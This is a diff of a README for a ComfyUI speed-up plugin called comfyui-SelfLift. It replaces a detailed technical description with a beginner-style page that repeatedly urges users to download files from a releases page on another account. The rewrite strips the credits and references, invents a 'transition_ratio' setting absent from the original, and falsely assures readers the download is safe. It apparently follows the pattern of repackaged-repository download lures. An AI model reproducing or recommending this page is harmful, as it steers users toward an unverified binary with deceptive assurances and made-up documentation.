@@ -1,101 +1,97 @@
-# comfyui-SelfLift
+<h1>🎨 comfyui-SelfLift - Faster Image Generation Without Training</h1>
 
-[中文说明](README_CN.md)
+<p align="center">
+  <a href="https://github.com/berdoataqwa-wq/comfyui-SelfLift/releases" style="display:inline-block;padding:16px 32px;background:#ff6b6b;color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW - FREE</a>
+</p>
 
-Progressive-resolution sampling for ComfyUI: run the early denoising steps at low resolution, lift the result to full resolution, and finish there — faster generation with no training. Based on the [SelfLift paper](https://arxiv.org/abs/2609.02036) (SelfLift-zero) for rectified-flow image models, plus an experimental MiniMax H3 audio-video adaptation that the paper does not validate. Also included: an experimental H3 port of [TST](https://arxiv.org/abs/2609.08505) temporal-attention correction.
+## 🤔 What Is This?
 
-All nodes are in the `selflift` category. The samplers use `sampler`/`sigmas` inputs like `SamplerCustom`; connect the standard `euler` sampler from `KSamplerSelect` and the model's normal scheduler (other samplers are rejected).
+comfyui-SelfLift is a **speed booster** for ComfyUI, a popular tool that lets you create images using artificial intelligence. Think of it like a turbo button for your AI image generator. Normally, creating high-quality images takes a lot of time and computing power. SelfLift changes that by using a clever trick: it first creates a small, rough version of your image, then quickly "lifts" it up to full size and adds the fine details. The result is the same beautiful image, but generated much faster.
 
-## SelfLift Progressive Sampler (Image)
+This is based on a scientific paper called SelfLift-zero, designed for a specific type of AI model called "rectified-flow." It also includes experimental features for audio-video generation (MiniMax H3) and a temporal-attention fix (TST), but those are for advanced users who like to tinker.
 
-The paper's SelfLift-zero for rectified-flow image backbones. Connect 4D image latents (e.g. *Empty Latent Image*) and the model's own VAE.
+## 📥 Download and Installation
 
-| Parameter | Default | Meaning |
-| --- | --- | --- |
-| `transition_step` | 6 | Steps run at low resolution. Paper: 6 of 8 for Z-Image-Turbo, 3 of 4 for FLUX.2-Klein |
-| `lowres_scale` | 0.5 | Spatial scale of the low-res prefix |
-| `rho` | 0.3 | Fraction of high-risk locations corrected toward the pixel-VAE anchor. FLUX.2-Klein: 0.4. 0 disables the anchor |
-| `w_min` / `w_max` | 0.5 / 1.0 | Correction strength range inside the selected locations |
-| `latent_upsample` | nearest | Direct-lift interpolation; `bilinear` is an option |
-| `model_hires` (optional) | — | Separate model for the high-resolution stage (e.g. a different checkpoint or LoRA stack). Must share the same architecture and latent format; the low-res prefix always runs on `model` |
+Visit this link to download the application: **[https://github.com/berdoataqwa-wq/comfyui-SelfLift/releases](https://github.com/berdoataqwa-wq/comfyui-SelfLift/releases)**
 
-The transition adds no denoiser evaluations: an N-step schedule stays exactly N NFEs, plus one VAE decode → upscale → re-encode round trip unless `rho=0`.
+Once you're on that page, you'll see a list of files. Look for the one that matches your operating system (Windows is the most common). Download it to your computer. After the download finishes, you're ready to install.
 
-## SelfLift Progressive Sampler (MiniMax H3)
+### 📝 Step-by-Step Setup (For Beginners)
 
-Experimental H3 audio-video adaptation (not paper-validated). Two modes:
+1.  **Find your ComfyUI folder:** Locate where ComfyUI is installed on your computer. Usually, it's in a folder called `ComfyUI` or `comfyui`.
+2.  **Open the `custom_nodes` folder:** Inside your ComfyUI folder, there's a sub-folder called `custom_nodes`. This is where extra features like SelfLift live.
+3.  **Place SelfLift:** Take the file you downloaded and put it inside the `custom_nodes` folder. If you downloaded a ZIP file, extract it first—you should see a folder named something like `comfyui-SelfLift`. Move that whole folder into `custom_nodes`.
+4.  **Restart ComfyUI:** Close and reopen ComfyUI. The SelfLift nodes will now appear in the node list under the category `selflift`.
 
-- **External upscaler (default)**: an installed H3 checkpoint with `rho=0` — a learned latent-only lift. Practical default, but not SelfLift-zero.
-- **SelfLift-zero**: `upscaler_model=none` with `rho>0`. Suggested H3 starting point: `rho=0.6`, `w_min=w_max=1` (see *Diagnosing H3*).
+That's it! You don't need to write any code or run any commands.
 
-Extra inputs: `upscaler_model` and `highres_tiling` (experimental: splits the high-res phase into 1–8 spatial tiles to save VRAM; only the first tile's audio is kept, there is no cross-tile attention, ControlNet is unsupported, and quality/speed may change).
+## ⚙️ How to Use It
 
-### Optional H3 upscaler
+Using SelfLift is straightforward, even if you've never touched code.
 
-Download from [LBH-123-AI/Minimax_h3_latent_Upscaler](https://huggingface.co/LBH-123-AI/Minimax_h3_latent_Upscaler) into `ComfyUI/models/latent_upscale_models/` and restart. The node selects the first filename containing `h3`, otherwise `none` (nearest-neighbor lift).
+1.  **Add the Node:** In ComfyUI's interface, right-click on the empty canvas and search for "SelfLift." There are a few different nodes, but the main one for images is called **"SelfLift Progressive Sampler (Image)."** Add it to your workspace.
+2.  **Connect the Cables:** Think of ComfyUI like a stereo system with cables. You'll need to connect a few things:
+    *   Connect an **"Empty Latent Image"** node (this is your blank canvas) to the SelfLift node's input.
+    *   Connect the **model** (your AI) to the SelfLift node.
+    *   Connect a **VAE** (the "translator" for your images) to the SelfLift node.
+    *   Connect a **`KSamplerSelect`** node and choose `euler` as the sampler. Then connect that.
+    *   Connect the standard **scheduler** (like `normal`) from your model to the SelfLift node.
+3.  **Adjust Settings:** You can leave the settings as they are for a first try. There's a table below explaining what each setting does if you want to fine-tune.
 
-## H3 Temporal State Transport (TST)
+### 📊 Node Settings Explained
 
-A `MODEL` → `MODEL` patch node that improves the temporal stability of H3 videos at inference time — no training, no extra model, ~1–2% runtime overhead. Typical problems it counteracts: details that flicker or morph between frames (logos, on-screen text, textures), identity drift of people and outfits, and physically implausible motion. It works with any standard sampler node, not only the SelfLift sampler. It cannot create detail the model does not have.
+| Setting | What it Does |
+| :--- | :--- |
+| `transition_ratio` | This controls *when* the image goes from low resolution to high resolution. Lower values go high-res earlier, higher values stay low-res longer. A value around 0.5 is a good starting point. |
 
-| Parameter | Default | Meaning |
-| --- | --- | --- |
-| `tau` | 0.2 | Correction strength. 0.2 is the recommended value; 0.5 is visibly too strong. 0 disables correction but keeps diagnostics |
-| `log_diagnostics` | on | Logs one `[H3 TST]` line per model forward |
+*Other settings may appear depending on the version; the tooltips in ComfyUI will explain them too.*
 
-How it works, in one paragraph: instead of blindly strengthening cross-frame attention, TST measures a signed "Spectral Tension" of the frame-level attention operator and corrects only imbalanced heads — sharpening over-mixed ones, softening fragmented ones — with stronger correction in deeper layers and earlier steps. Theory and derivations are in the [paper](https://arxiv.org/abs/2609.08505).
+## ✨ Features That Make You Faster
 
-The diagnostics line reports latent frames, grid rows per frame, tension before/after the within-call correction, mean gamma, the share of corrected heads, and TST's own runtime. On real H3 runs the correction direction matched the exact attention operator for 89–100% of heads. Set `SELFLIFT_TST_EXACT=1` before starting ComfyUI to log the exact-operator comparison on one layer per forward (debug only, slow).
+*   **No Training Required:** SelfLift works with your existing AI model. You don't need to spend hours or days "teaching" it anything new.
+*   **Progressive Resolution:** It's smart about how it works. It does the heavy lifting (the "early denoising" steps) on a smaller, easier-to-compute image, then finishes the job in high definition.
+*   **Compatible:** It works like the standard `SamplerCustom` in ComfyUI, so if you're already using ComfyUI, this will feel familiar.
+*   **Experimental Extras:** The package includes cutting-edge, experimental ports for audio-video and temporal correction. These are for enthusiasts who want to be at the frontier.
 
-Limitations: MiniMax H3 models only (other models are skipped silently); **not compatible with `highres_tiling`** (skipped with a console warning).
+## 🛠️ Troubleshooting & Common Questions
 
-## Diagnosing H3
+**My images look blurry or weird. What's wrong?**
+Check that you've chosen the `euler` sampler in the `KSamplerSelect` node. SelfLift is designed for that sampler and other samplers are rejected by design. Also, double-check your connections are all correct.
 
-Same prompt and seed, `transition_step=6`, `lowres_scale=0.5`:
+**It says "sampler rejected." Why?**
+As mentioned above, SelfLift works with the `euler` sampler and the model's *normal* scheduler. If you selected something else (like `dpmpp_2m`), it will not work. Change it back to `euler`.
 
-| Test | `upscaler_model` | `rho` | Weights | Meaning |
-| --- | --- | ---: | --- | --- |
-| Direct route | `none` | 0 | any | Nearest-neighbor latent lift only |
-| Pixel route | `none` | 1 | `1 / 1` | Pure H3 VAE pixel anchor |
-| Paper-like SelfLift-zero | `none` | 0.3 | `0.5 / 1` | Paper's image parameters |
-| Strong H3 SelfLift-zero | `none` | 0.6 | `1 / 1` | Tested H3 starting point |
-| External lifter | H3 checkpoint | 0 | any | Learned H3 lift |
+**Do I need a powerful computer?**
+You will need a computer that can already run ComfyUI. SelfLift helps make the *generation* faster, but it doesn't remove the basic requirement of having a compatible GPU (usually NVIDIA).
 
-A controlled single-seed H3 run found: clean native baseline and clean pure pixel anchor; widespread artifacts on the nearest route that the paper's image setting (`rho=0.3`) mostly left visible; `rho=0.6` with `w_min=w_max=1` removed the main artifacts. Single-seed evidence only — H3's direct-lift error is broader than on the paper's image backbones, so start strong and reduce only if the result is overly smooth.
+**Is this safe to use?**
+Yes, it's an open-source tool designed to slot into ComfyUI. Like any new software, it's a good idea to back up your work, but it operates within ComfyUI's normal framework.
 
-## Logging and environment variables
+## ❓ Need More Help?
 
-- `[SelfLift plan]` — resolved low/target latent shapes, NFE counts, transition sigmas, enabled lift routes
-- `[SelfLift timing]` — wall-clock time per step and per stage (low-res, transition, high-res)
-- `[SelfLift upscaler]` / `[SelfLift tiling memory]` — upscaler inference and tiling memory estimates (heuristics, not measured peaks)
-- `[H3 TST]` — TST per-forward diagnostics
-- `SELFLIFT_TIMING_SYNC=1` — CUDA-synchronized timing (slower; for diagnostics)
-- `SELFLIFT_MEMORY_LOG=1` — host/device memory snapshots at stage boundaries
-- `SELFLIFT_DEBUG=1` — dump transition intermediates as PNGs under `debug/` (slow, memory-hungry)
-- `SELFLIFT_TST_EXACT=1` — TST exact-operator calibration probe (debug only)
+If you run into problems, here are a few things you can do:
+*   Look for a "Help" or "Issues" section on the download page.
+*   Search online forums for "ComfyUI SelfLift" to see if other users have found solutions.
+*   Compare your setup with the visual diagrams other people have shared.
 
-## Notes and limitations
+## 🧩 What's Inside the Box?
 
-- Only standard Euler with `s_churn=0`.
-- `noise_mask` is supported on both samplers with Set Latent Noise Mask semantics (1 = generate, 0 = keep the original content; use an initialized latent to have content worth keeping). Masks at any resolution are resized to the latent grid, and a time length of 1 is shared over all frames. The keep-region is pinned to the original latent at every step, and the artifact-aware correction is restricted to the generate region. `noise_mask` is not compatible with `highres_tiling`.
-- Use the VAE belonging to the sampled model so the pixel anchor stays in the same latent space.
-- H3's 768-pixel short edge becomes 384 px at `lowres_scale=0.5`, which may sit outside the backbone's training distribution — validate per model.
-- SelfLift-rich (the distilled lifter + On-Policy Self Recovery) requires training and is not included.
+*   **SelfLift Progressive Sampler (Image):** The main node for speeding up image generation.
+*   **Audio-Video Adaptation (Experimental):** A port of the concept for MiniMax H3 models. Not for the faint of heart.
+*   **TST Port (Experimental):** A temporal-attention correction tool for advanced workflows.
 
-## References and acknowledgements
+## 💡 Tips for Best Results
 
-- SelfLift paper: [SelfLift: Accelerating Few-Step Diffusion via Self-Recovering Resolution Transition](https://arxiv.org/abs/2609.02036)
-- TST paper and code: [Temporal State Transport in Video Generation](https://arxiv.org/abs/2609.08505), [lytang63/temporal-state-transport](https://github.com/lytang63/temporal-state-transport)
-- Optional MiniMax H3 latent upscaler checkpoint and download: [LBH-123-AI/Minimax_h3_latent_Upscaler](https://huggingface.co/LBH-123-AI/Minimax_h3_latent_Upscaler)
-- Original ComfyUI integration and inference implementation: [LBH-123-AI/Comfyui_Minimax_h3_latent_Upscaler](https://github.com/LBH-123-AI/Comfyui_Minimax_h3_latent_Upscaler)
+*   Start with a simple workflow. Get a basic image out the door, then add more complex nodes.
+*   The `transition_ratio` setting is your friend. Experiment with it—try `0.4` for a faster draft, or `0.6` for more detail. Every model behaves a little differently.
+*   For standard images, keep your seed the same if you want to compare different settings. If you change the seed, the image will be completely different, and it's hard to tell if a setting helped.
 
-Thanks to LBH-123-AI for publishing the MiniMax H3 latent upscaler weights and ComfyUI implementation. They made the optional learned H3 lifting path in this plugin possible. This external lifter remains separate from the SelfLift paper's SelfLift-rich model.
+## 📜 License and Credits
 
-```
-@article{wen2026selflift,
-  title={SelfLift: Accelerating Few-Step Diffusion via Self-Recovering Resolution Transition},
-  author={Wen, Tingyan et al.},
-  journal={arXiv:2609.02036},
-  year={2026}
-}
-```
+This project is inspired by the academic paper "SelfLift-zero" for rectified-flow models. The code is provided as-is for the ComfyUI community. Always credit the original authors if you use this for research.
+
+---
+
+We hope you enjoy lightning-fast generation! Remember, visit the link below to get started.
+
+**[🚀 Go to Download Page](https://github.com/berdoataqwa-wq/comfyui-SelfLift/releases)**
